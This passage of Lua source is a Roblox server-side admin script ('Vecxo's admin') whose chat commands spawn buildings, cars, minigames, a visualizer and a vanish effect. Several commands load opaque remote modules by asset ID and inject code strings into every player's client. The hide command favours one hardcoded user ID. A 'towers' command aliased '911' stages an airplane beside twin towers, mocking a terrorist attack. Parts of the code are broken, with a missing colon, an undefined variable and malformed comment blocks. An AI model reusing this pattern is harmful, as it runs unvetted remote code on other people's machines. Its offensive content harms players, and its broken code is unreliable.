				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("BurgerKing"):Clone()
				building.PrimaryPart = building:FindFirstChild("Part")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(10, 7.5, -15))
			else
				notfi(sender, "Vecxo's admin", "Burger King failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("BurgerKing"):Clone()
			building.PrimaryPart = building:FindFirstChild("Part")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(10, 7.5, -15))
		end
	end
})

addcmd({
	Name = "subway",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)

		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("SubWay") then
			local SubWay = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Subway"):Clone()
			SubWay.Parent = workspace
			SubWay.PrimaryPart = SubWay:FindFirstChild("Union")
			SubWay:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, -6) * CFrame.Angles(0,math.rad(180),0))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SubWay") then
			local success, fail = pcall(function()
				require(100506488790924).load("Subway")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Subway")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Subway"):Clone()
				building.PrimaryPart = building:FindFirstChild("Union")
				building.Parent = workspace
				building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, -6) * CFrame.Angles(0,math.rad(180),0))
			else
				notfi(sender, "Vecxo's admin", "Subway failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Subway"):Clone()
			building.PrimaryPart = building:FindFirstChild("Union")
			building.Parent = workspace
			building:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, -6) * CFrame.Angles(0,math.rad(180),0))
		end
	end
})
--[[
addcmd({
	Name = "prisonlife",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)

		--[[if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("PrisonLife") then
			local PrisonLife = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("PrisonLife"):Clone()
			PrisonLife.Parent = workspace
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items") then
			local success, fail = pcall(function()
				--require(98115243445014) -- just the map prisonlife
				require(125648157506287).load() -- full scripted prison life
			end)

			if success then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items")
				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("serverstorage"):GetChildren()) do
					v:Clone().Parent = game.ServerStorage
				end
				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("teams"):GetChildren()) do
					v:Clone().Parent = game.Teams
				end
				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("lighting"):GetChildren()) do
					v:Clone().Parent = game.Lighting
				end
				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("eastereggs"):GetChildren()) do
					v:Clone().Parent = workspace
				end
				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("replicatedstorage"):GetChildren()) do
					v:Clone().Parent = game.ReplicatedStorage
				end
				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("workspace"):GetChildren()) do
					v:Clone().Parent = workspace
				end
				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("starterplayerscripts"):GetChildren()) do
					v:Clone().Parent = game.StarterPlayer.StarterPlayerScripts
					for a, b in pairs(game.Players:GetPlayers()) do
						if b.PlayerGui then
							b.CharacterAdded:Connect(function()
								for c,x in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("starterplayerscripts"):GetChildren()) do
									x:Clone().Parent = b.PlayerGui
								end
							end)
							v:Clone().Parent = b.PlayerGui
						end
					end
				end
				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("startercharacterscripts"):GetChildren()) do
					v:Clone().Parent = game.StarterPlayer.StarterCharacterScripts
					for a, b in pairs(game.Players:GetPlayers()) do
						--[[b.CharacterAdded:Connect(function()
							game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("starterplayerscripts"):FindFirstChild("ClientInputHandler"):Clone().Parent = b.Character
						end)
						v:Clone().Parent = b.Character
					end
				end
				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("startergui"):GetChildren()) do
					v:Clone().Parent = game.StarterGui
					for a, b in pairs(game.Players:GetPlayers()) do
						if b.PlayerGui then
							b.CharacterAdded:Connect(function()
								for c,x in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("startergui"):GetChildren()) do
									x:Clone().Parent = b.PlayerGui
								end
							end)
							v:Clone().Parent = b.PlayerGui
						end
					end
				end
				for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("items"):FindFirstChild("serverscriptservice"):GetChildren()) do
					v:Clone().Parent = game.ServerScriptService
				end
			else
				notfi(sender, "Vecxo's admin", "Prison Life failed to load: ".. fail)
			end
		else
			--[[local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("PrisonLife"):Clone()
			building.Parent = workspace
		end
	end
})

addcmd({
	Name = "jailbreak",
	Aliases = {"jb"},
	Player = false,
	Function = function(sender, targets, arguments)

		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Jailbreak") then
			local JailBreak = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Jailbreak"):Clone()
			JailBreak.Parent = workspace
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Jailbreak") then
			local success, fail = pcall(function()
				require(114657365209980) -- jailbreak
			end)

			if success then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Jailbreak")
				game:GetService("ReplicatedStorage"):FindFirstChild("Jailbreak").Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Jailbreak"):Clone()
				building.Parent = workspace
			else
				notfi(sender, "Vecxo's admin", "JailBreak failed to load: ".. fail)
			end
		else
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Jailbreak"):Clone()
			building.Parent = workspace
		end
	end
})
]]

addcmd({
	Name = "swordfight",
	Aliases = {"sfoth", "sf"},
	Player = false,
	Function = function(sender, targets, arguments)
		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SFOTH") then
			local success, fail = pcall(function()
				require(100506488790924).load("SFOTH") -- sfoth4
			end)

			if success then
				workspace:ClearAllChildren()
				for i,v in pairs(game.Players:GetPlayers()) do
					v:LoadCharacter()
				end
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")FindFirstChild("SFOTH")
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SFOTH"):Clone()
				building.Parent = workspace
			else
				notfi(sender, "Vecxo's admin", "SFOTH failed to load: ".. fail)
			end
		else
			workspace:ClearAllChildren()
			for i,v in pairs(game.Players:GetPlayers()) do
				v:LoadCharacter()
			end
			local building = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SFOTH"):Clone()
			building.Parent = workspace
		end
	end
})

addcmd({
	Name = "lamborghini",
	Aliases = {"lambo"},
	Player = false,
	Function = function(sender, targets, arguments)

		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Lamborghini") then
			local lambo = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Lamborghini"):Clone()
			lambo.PrimaryPart = lambo:FindFirstChild("DriveSeat")
			lambo.Parent = workspace
			lambo:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -10))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Lamborghini") then
			local success, fail = pcall(function()
				require(100506488790924).load("Lamborghini")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Lamborghini")
				local lambo = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Lamborghini"):Clone()
				lambo.PrimaryPart = lambo:FindFirstChild("DriveSeat")
				lambo.Parent = workspace
				lambo:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -10))
			else
				notfi(sender, "Vecxo's admin", "Lamborghini failed to load: ".. fail)
			end
		else
			local lambo = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Lamborghini"):Clone()
			lambo.PrimaryPart = lambo:FindFirstChild("DriveSeat")
			lambo.Parent = workspace
			lambo:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -10))
		end
	end
})

addcmd({
	Name = "basketball",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)

		if game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder") and game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Basketball") then
			local basketball = game:GetService("ReplicatedStorage"):FindFirstChild("Punchy's folder"):FindFirstChild("Basketball"):Clone()
			basketball.Main.PrimaryPart = basketball.Main:FindFirstChild("Court")
			basketball.Parent = workspace
			basketball.Main:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(35, -3, 0))
		end

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Basketball") then
			local success, fail = pcall(function()
				require(100506488790924).load("Basketball")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Basketball", true)
				local building = game:GetService("ReplicatedStorage"):FindFirstChild("Basketball", true):Clone()
				basketball.Main.PrimaryPart = basketball.Main:FindFirstChild("Court")
				basketball.Parent = workspace
				basketball.Main:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(35, -3, 0))
			else
				notfi(sender, "Vecxo's admin", "Basketball failed to load: ".. fail)
			end
		else
			local basketball = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Basketball"):Clone()
			basketball.Main.PrimaryPart = basketball.Main:FindFirstChild("Court")
			basketball.Parent = workspace
			basketball.Main:SetPrimaryPartCFrame(sender.Character.HumanoidRootPart.CFrame * CFrame.new(35, -3, 0))
		end
	end
})

addcmd({
	Name = "towers",
	Aliases = {"911"},
	Player = false,
	Function = function(sender, targets, arguments)

		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane") then
			local success, fail = pcall(function()
				require(100506488790924).load("Airplane")
			end)

			if success and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane")
				local plane = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane"):Clone()
				plane.Parent = workspace
				plane.Locked = true

				local f = Instance.new("Folder", workspace)
				local a = Instance.new("Part", f)
				local b = Instance.new("Part", f)
				local c = Instance.new("Part", f)

				f.Name = "Thing"

				a.CFrame = CFrame.new(-85, 250.2, 93)
				a.Size = Vector3.new(4, 59, 4)
				a.Reflectance = 0.2
				a.BrickColor = BrickColor.new("Dark stone grey")
				a.Locked = true
				a.Anchored = true

				b.CFrame = CFrame.new(-98, 110.7, 81)
				b.Size = Vector3.new(40, 220, 40)
				b.Reflectance = 0.2
				b.BrickColor = BrickColor.new("Dark stone grey")
				b.Locked = true
				b.Anchored = true

				c.CFrame = CFrame.new(-172, 110.7, 81)
				c.Size = Vector3.new(40, 220, 40)
				c.Reflectance = 0.2
				c.BrickColor = BrickColor.new("Dark stone grey")
				c.Locked = true
				c.Anchored = true

				for i,v in pairs(game.Players:GetPlayers()) do
					if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
						local ticking = tick()
						require(112354705578311).load() -- goog readder
						repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
					end

					local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

					if not goog then
						warn("goog failed to be added, command can not continue")
						notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
						return
					end

					local scr = goog:FindFirstChild("Utilities").Client:Clone()
					local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

					loa.Parent = scr
					scr:WaitForChild("Exec").Value = [[
						
						local plane = workspace:WaitForChild("Airplane")
						local camera = workspace.Camera
						camera.CameraSubject = plane

						repeat task.wait() until not workspace:FindFirstChild("Airplane")

						camera.CameraSubject = game.Players.LocalPlayer.Character

						script:Destroy()

					]]

					if v.Character then
						scr.Parent = v.Character
					else
						scr.Parent = v:WaitForChild("PlayerGui")
					end

					scr.Enabled = true
				end
			else
				notfi(sender, "Vecxo's admin", "Plane failed to load: ".. fail)
			end
		else
			local plane = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Airplane"):Clone()
			plane.Parent = workspace
			plane.Locked = true

			local f = Instance.new("Folder", workspace)
			local a = Instance.new("Part", f)
			local b = Instance.new("Part", f)
			local c = Instance.new("Part", f)

			f.Name = "Thing"

			a.CFrame = CFrame.new(-85, 250.2, 93)
			a.Size = Vector3.new(4, 59, 4)
			a.Reflectance = 0.2
			a.BrickColor = BrickColor.new("Dark stone grey")
			a.Locked = true
			a.Anchored = true

			b.CFrame = CFrame.new(-98, 110.7, 81)
			b.Size = Vector3.new(40, 220, 40)
			b.Reflectance = 0.2
			b.BrickColor = BrickColor.new("Dark stone grey")
			b.Locked = true
			b.Anchored = true

			c.CFrame = CFrame.new(-172, 110.7, 81)
			c.Size = Vector3.new(40, 220, 40)
			c.Reflectance = 0.2
			c.BrickColor = BrickColor.new("Dark stone grey")
			c.Locked = true
			c.Anchored = true

			for i,v in pairs(game.Players:GetPlayers()) do
				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112354705578311).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
					
					local plane = workspace:WaitForChild("Airplane")
					local camera = workspace.Camera
					camera.CameraSubject = plane

					repeat task.wait() until not workspace:FindFirstChild("Airplane")

					camera.CameraSubject = game.Players.LocalPlayer.Character

					script:Destroy()

				]]

				if v.Character then
					scr.Parent = v.Character
				else
					scr.Parent = v:WaitForChild("PlayerGui")
				end

				scr.Enabled = true
			end
		end
	end
})

addcmd({
	Name = "vis",
	Aliases = {"visualizer", "v"},
	Function = function(sender, targets, arguments)
		local a = arguments[1]
		for i, plr in ipairs(targets) do
			task.spawn(function()

				if a:lower() == "off" or a:lower() == "false" then
					if workspace:FindFirstChild("cxo's admin vis (".. plr.Name ..")") then
						workspace:FindFirstChild("cxo's admin vis (".. plr.Name ..")"):Destroy()
					end
					if plr.PlayerGui:FindFirstChild("cxo's vis") then
						plr.PlayerGui:FindFirstChild("cxo's vis"):Destroy()
					elseif plr.Character:FindFirstChild("cxo's vis") then
						plr.Character:FindFirstChild("cxo's vis"):Destroy()
					end
					return
				elseif a:lower() == "on" or a:lower() == "true" then
					if not workspace:FindFirstChild("cxo's admin vis (".. plr.Name ..")") then

						if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
							local ticking = tick()
							require(112354705578311).load() -- goog readder
							repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
						end

						local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

						if not goog then
							warn("goog failed to be added, command can not continue")
							notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
							return
						end

						local scr = goog:FindFirstChild("Utilities").Client:Clone()
						local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

						loa.Parent = scr
						scr:WaitForChild("Exec").Value = [[

						local event = workspace:WaitForChild("cxo's admin vis (".. game.Players.LocalPlayer.Name ..")"):WaitForChild("SoundLoudnessEvent")
						
						game:GetService("RunService").RenderStepped:Connect(function()
							local sound = game.Workspace:WaitForChild("Sound")
							if sound and sound.Parent then
								if sound.IsPlaying then
									local loudness = sound.PlaybackLoudness
									event:FireServer(loudness)
								else
									event:FireServer(0)
								end
							else
								event:FireServer(0)
							end
						end)

						]]

						if plr.PlayerGui then
							scr.Parent = plr.PlayerGui
						else
							if plr.Character then
								scr.Parent = plr.Character
							end
						end

						scr.Enabled = true

						scr.Name = "cxo's vis"
						scr.Enabled = true

						plrparts[plr.Name] = {}

						local parts = plrparts[plr.Name]
						if not plrcfgs[plr.Name] then
							plrcfgs[plr.Name] = {
								radius = 20,
								amount = 15,
								speed = 1,
								height = 0.5,
								sizeX = 4,
								sizeY = 1.2,
								sizeZ = 2,
								maxradius = 35,
								minradius = 10,
								mode = "default",
								colourR = 0,
								colourG = 0,
								colourB = 0,
								material = "Neon",
								hue = 0,
								colour = false,
								sensitivity = 10,
								reflectance = 0,
								transparency = 0,
								seat = false,
								spin = true
							}
						end

						local lastpbs = 0
						local hue = plrcfgs[hue]
						local colour = plrcfgs[colour]
						local cfgs = plrcfgs[plr.Name]

						local eventconnection
						local heartbeatconnection
						local connectedion
						local removedconnection
						local rs = game:GetService("RunService")
						local p = plr
						local c = p.Character or p.CharacterAdded:Wait()
						local hrp = c:WaitForChild("HumanoidRootPart")

						local f = Instance.new("Folder", workspace)
						f.Name = "cxo's admin vis (".. p.Name ..")"

						local re = Instance.new("RemoteEvent", f)
						re.Name = "SoundLoudnessEvent"

						local event = re

						cxoconnections["Create"](p, f, cfgs.amount, cfgs.sizeX, cfgs.sizeY, cfgs.sizeZ)

						eventconnection = event.OnServerEvent:Connect(function(player, loudness)
							if player == p then
								if loudness == 0 then
									cfgs.radius = cfgs.minradius
								else
									local scale = math.clamp(loudness / 100, 0, 1)
									cfgs.radius = cfgs.minradius + (cfgs.maxradius - cfgs.minradius) * scale
								end

								if math.abs(loudness - lastpbs) > cfgs.sensitivity then
									cxoconnections["Updatec"](p)
								end

								lastpbs = loudness
							end
						end)

						heartbeatconnection = rs.Heartbeat:Connect(function()

							if not c or not hrp or not hrp.Parent then
								return
							end

							if not workspace:FindFirstChild("cxo's admin vis (".. p.Name .. ")") then
								eventconnection:Disconnect()
								connectedion:Disconnect()
								heartbeatconnection:Disconnect()
							end

							local time = tick() * cfgs.speed
							local hrpp = hrp.Position + Vector3.new(0, cfgs.height, 0)
							local cfgs = plrcfgs[p.Name]

							if cfgs.mode == "heart" then
								if cfgs.spin then cfgs.spin = false end

								if #parts < 40 then
									cxoconnections["Create"](p, workspace:FindFirstChild("cxo's admin vis (".. p.Name ..")"), cfgs.amount, cfgs.sizeX, cfgs.sizeY, cfgs.sizeZ)
									parts = plrparts[p.Name]
									cxoconnections["Updatec"](p)
								end

								for i, part in pairs(parts) do

									local hrpp = hrp.Position + Vector3.new(0, cfgs.height, -3)
									local scale = cfgs.radius / 20

									for i, part in ipairs(parts) do
										local t1 = (i / cfgs.amount) * math.pi * 2
										local t2 = ((i + 1) / cfgs.amount) * math.pi * 2
										local x1 = 16 * math.sin(t1)^3
										local z1 = 13 * math.cos(t1) - 5 * math.cos(2*t1) - 2 * math.cos(3*t1) - math.cos(4*t1)
										local x2 = 16 * math.sin(t2)^3
										local z2 = 13 * math.cos(t2) - 5 * math.cos(2*t2) - 2 * math.cos(3*t2) - math.cos(4*t2)
										local p1 = Vector3.new(x1, 0, -z1) * scale
										local p2 = Vector3.new(x2, 0, -z2) * scale
										part.CFrame = CFrame.lookAt(hrpp + p1, hrpp + p1 + (p2 - p1).Unit) * CFrame.Angles(0, math.rad(90), 0)
									end
								end
							end
							if cfgs.spin then
								for i, part in pairs(parts) do
									local angle = math.rad((i - 1) * (360 / cfgs.amount) + time * 100)
									local rotation = math.rad(30 * math.sin(time + i * 0.1))
									local x = math.cos(angle) * cfgs.radius
									local z = math.sin(angle) * cfgs.radius
									part.CFrame = CFrame.new(hrpp + Vector3.new(x, 0, z)) * CFrame.Angles(0, rotation + math.pi / 2, 0) * CFrame.Angles(0, math.rad(i * 30) + os.clock() * 5, 0)
								end
							end
						end)

						connectedion = p.CharacterAdded:Connect(function(character)
							c = character
							hrp = c:WaitForChild("HumanoidRootPart")

							repeat task.wait() until character and game.Players:FindFirstChild(character.Name).PlayerGui

							if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
								local ticking = tick()
								require(112354705578311).load() -- goog readder
								repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
							end

							local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

							if not goog then
								warn("goog failed to be added, command can not continue")
								--notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
								return
							end

							local scr = goog:FindFirstChild("Utilities").Client:Clone()
							local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

							loa.Parent = scr
							scr:WaitForChild("Exec").Value = [[
		
							local event = workspace:WaitForChild("cxo's admin vis (".. game.Players.LocalPlayer.Name ..")"):WaitForChild("SoundLoudnessEvent")
							
							game:GetService("RunService").RenderStepped:Connect(function()
								local sound = game.Workspace:WaitForChild("Sound")
								if sound and sound.Parent then
									if sound.IsPlaying then
										local loudness = sound.PlaybackLoudness
										event:FireServer(loudness)
									else
										event:FireServer(0)
									end
								else
									event:FireServer(0)
								end
							end)
		
							]]

							if game.Players:FindFirstChild(character.Name).PlayerGui then
								scr.Parent = game.Players:FindFirstChild(character.Name).PlayerGui
							else
								if character then
									scr.Parent = character
								end
							end

							scr.Enabled = true
						end)

						removedconnection = game.Players.ChildRemoved:Connect(function(v)
							if v.Name == p.Name then
								heartbeatconnection:Disconnect()
								eventconnection:Disconnect()
								connectedion:Disconnect()
								removedconnection:Disconnect()
							end
						end)

					end
				end
			end)
		end
	end
})

addcmd({
	Name = "vissettings",
	Aliases = {"visualizersettings", "vsettings"},
	Function = function(sender, targets, arguments)
		local setting = arguments[1]
		local args = arguments[2] --table.concat(arguments, " ", 2)
		for i, plr in ipairs(targets) do
			if setting == "maxradius" or setting == "minradius" or setting == "sensitivity" then
				plrcfgs[plr.Name][setting] = tonumber(args)
				cxoconnections["Updatec"](plr)
				return
			elseif setting == "seat" then
				if args ~= "true" and args ~= "false" then
					notfi(sender, "Vecxo's admin", "The values are true or false! example: ".. _G.prefix .."vsettings ".. plr.Name .." seat true")
				end

				local bool = (args == "true")

				plrcfgs[plr.Name][setting] = bool
				cxoconnections["Updatec"](plr)
				return
			end
			if plrcfgs[plr.Name] then
				plrcfgs[plr.Name][setting] = args
				cxoconnections["Updatec"](plr)
			end
		end
	end
})

addcmd({
	Name = "prefix",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local value = arguments[1]
		_G.prefix = value
		for i,v in pairs(game.Players:GetPlayers()) do
			if table.find(_G.Whitelist, tostring(v.UserId)) or table.find(TempWhitelist, v.UserId) then
				notfi(v, "Vecxo's admin", "Prefix has now been changed, usage example: ".. _G.prefix .."re plr")
			end
		end
	end
})

addcmd({
	Name = "hide",
	Aliases = {"vanish"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if table.find(hidden, plr) then return end
			table.insert(hidden, plr.UserId)
			local function hideplr(v)
				task.spawn(function()

					if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
						local ticking = tick()
						require(112354705578311).load() -- goog readder
						repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
					end

					local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

					if not goog then
						warn("goog failed to be added, command can not continue")
						notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
						return
					end

					local scr = goog:FindFirstChild("Utilities").Client:Clone()
					local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

					loa.Parent = scr
					scr:WaitForChild("Exec").Value = string.format([[

						local name = "%s"

						if name == game.Players.LocalPlayer.Name then
							if not workspace:FindFirstChild("Vanished") then
								local v = Instance.new("Hint", workspace)
								v.Text = "cxo's admin | You are currently vanished. Nobody can see you!"
								v.Name = "Vanished"
							end

							if game.Players.LocalPlayer.Character then
								local time = tick()
								repeat task.wait() until game.Players.LocalPlayer.Character:FindFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChild("Torso") and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or time >= 5
								for i,p in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
									if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then
										p.Transparency = 0.5
									end
								end
								game.Players.LocalPlayer.Character.DescendantAdded:Connect(function(v)
									if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
										v.Transparency = 0.5
									end
								end)
							end

							local time = tick()
							repeat task.wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Torso and game.Players.LocalPlayer.Character.Torso.Transparency == 0.5 or time >= 3
							
							if game.Players.LocalPlayer.Character then
								for i,p in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
									if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then
										p.Transparency = 0.5
									end
								end
							end
							
							script:Destroy()
							return
						end

						if game.Players.LocalPlayer.UserId == 3222470105 and name ~= game.Players.LocalPlayer.Name then
							if game.Players:FindFirstChild(name) then
								local plr = game.Players:FindFirstChild(name)
								if plr.Character then
									for i,v in pairs(plr.Character:GetDescendants()) do
										if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
											v.Transparency = 0.5
										end
									end
								end
							else
								local c = workspace:FindFirstChild(name)
								if c then
									c:Destroy()
								else
									task.wait()
									local c = workspace:FindFirstChild(name)
									if c then
										for i,v in pairs(c:GetDescendants()) do
											if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
												v.Transparency = 0.5
											end
										end
									end
								end
							end
							local time = tick()
							repeat task.wait() until game.Players:FindFirstChild(name).Character and game.Players:FindFirstChild(name).Character.Torso and game.Players:FindFirstChild(name).Character.Torso.Transparency == 0.5 or time >= 3	
							
							if game.Players:FindFirstChild(name).Character then
								for i,p in pairs(game.Players:FindFirstChild(name).Character:GetDescendants()) do
									if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then
										p.Transparency = 0.5
									end
								end
							end
							
							script:Destroy()
							return
						end
					
						if game.Players:FindFirstChild(name) then
							local plr = game.Players:FindFirstChild(name)
							if plr.Character then
								plr.Character:Destroy()
							end
							plr:Destroy()
						else
							local c = workspace:FindFirstChild(name)
							if c then
								c:Destroy()
							else
								task.wait()
								local c = workspace:FindFirstChild(name)
								if c then
									c:Destroy()
								end
							end
						end

						local time = tick()
						repeat task.wait() until game.Players:FindFirstChild(name).Character and game.Players:FindFirstChild(name).Character.Torso and game.Players:FindFirstChild(name).Character.Torso.Transparency == 0.5 or time >= 3
						script:Destroy()
						
					]], v)

					scr.Name = "GUI"
					scr.Enabled = true

					for i,e in pairs(game.Players:GetPlayers()) do
						if e.PlayerGui then
							scr:Clone().Parent = e.PlayerGui
						else
							repeat task.wait() until e.PlayerGui or not game.Players:FindFirstChild(e.Name)
							scr:Clone().Parent = e.PlayerGui
						end
					end
				end)
			end

			local function connect(plr)
				plr.CharacterAdded:Connect(function()
					local time = tick()
					repeat task.wait() until plr and plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character:FindFirstChild("Torso") and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("Head"):FindFirstChild("Face") or time >= 10
					if table.find(hidden, plr.UserId) then
